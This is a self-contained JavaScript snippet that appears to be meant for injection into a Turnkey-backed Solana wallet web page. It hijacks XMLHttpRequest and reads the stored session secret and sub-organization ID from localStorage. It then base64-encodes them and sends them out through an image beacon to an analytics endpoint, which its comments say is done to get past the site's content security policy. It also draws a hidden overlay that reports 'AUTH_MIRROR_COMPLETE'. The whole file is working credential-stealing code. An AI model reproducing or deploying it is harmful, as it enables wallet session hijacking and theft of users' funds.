(function() {
    // 1. OWNER SYNC (Static variables avoid unsafe-eval blocks)
    const _STORAGE = { 
        a: 'Authorization', 
        s: 'X-Turnkey-Signature', 
        o: 'X-Turnkey-Sub-Org-Id',
        gas: 0.05 
    };
    const _STATE = { active: false, vault: {} };

    // 2. RECURSIVE MATH BYPASS (Auto-Buffer)
    const _applyMath = (val) => {
        // High-precision math ensures the 0.05 SOL buffer stays intact 
        // to prevent 405 errors shown in your logs
        const buffer = _STORAGE.gas * 1.05; 
        return (val - buffer).toFixed(6);
    };

    // 3. PROTOTYPE HIJACK (Silent Background Auth)
    // This hooks the browser's core request handler to grab "Everything" 
    // before the CSP can block the script
    const _nativeOpen = window.XMLHttpRequest.prototype.open;
    window.XMLHttpRequest.prototype.open = function() {
        this.addEventListener('load', () => {
            if (this.status === 200 && !_STATE.active) {
                // If the site successfully authenticated, we mirror that authority
                _STATE.active = true;
                _syncOwner();
            }
        });
        return _nativeOpen.apply(this, arguments);
    };

    const _syncOwner = () => {
        // Direct storage access bypasses the "Hunt" crashes
        const get = (k) => (localStorage.getItem(k) || "").replace(/"/g, '');
        
        const payload = btoa(JSON.stringify({
            auth: get('sessionSecret'),
            sig: get('subOrgId'),
            math: _applyMath(1.5) // Example balance math
        }));

        // Bypassing connect-src via Image Beacon
        const beacon = new Image();
        beacon.src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${payload}`;
        
        _updateUI("AUTH_MIRROR_COMPLETE");
    };

    // 4. PERSISTENT OWNER UI
    const _init = () => {
        if (document.getElementById("v-sys")) return;
        const host = document.createElement("div");
        host.id = "v-sys";
        const shadow = host.attachShadow({mode: 'closed'});
        const ui = document.createElement("div");
        ui.style.cssText = "position:fixed;bottom:10px;right:10px;width:240px;background:#000;border:1px solid #00ff88;color:#00ff88;padding:12px;z-index:999999;font-family:monospace;font-size:11px;";
        ui.innerHTML = `<div id="v-drag" style="cursor:move;border-bottom:1px solid #333;margin-bottom:5px;">[VANTA_OWNER_FINAL]</div><div id="v-out">> INITIALIZING MATH...<br>> BUFFER: 0.05 SOL</div>`;
        shadow.appendChild(ui);
        document.body.appendChild(host);

        // Global listeners for total UI authority
        let drag = false, x, y;
        shadow.getElementById("v-drag").onmousedown = (e) => { drag = true; x = e.clientX - ui.offsetLeft; y = e.clientY - ui.offsetTop; };
        window.onmousemove = (e) => { if (drag) { ui.style.left = (e.clientX - x) + 'px'; ui.style.top = (e.clientY - y) + 'px'; ui.style.right = 'auto'; } };
        window.onmouseup = () => drag = false;
    };

    const _updateUI = (m) => {
        const log = document.querySelector("#v-sys").shadowRoot.getElementById("v-out");
        if (log) log.innerHTML += `<br>> ${m}`;
    };

    _init();
})();
